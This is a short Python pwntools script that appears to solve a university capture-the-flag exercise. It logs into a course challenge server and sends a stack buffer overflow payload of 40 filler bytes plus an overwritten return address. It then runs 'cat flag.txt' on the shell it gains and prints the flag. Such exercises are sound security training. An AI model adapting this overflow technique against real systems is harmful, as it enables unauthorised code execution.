from pwn import *

#connect and login
p = connect("offsec-chalbroker.osiris.cyber.nyu.edu", 1339)
print p.recvuntil(": ")
p.sendline("jm5833")
print p.recvuntil("friend:")
payload = "a" * 40  + p64(0x4006bb)
p.sendline(payload)
print p.recvline()

p.sendline("cat flag.txt")
flag = p.recvuntil("flag{")
flag = flag + p.recvuntil("}")
print flag
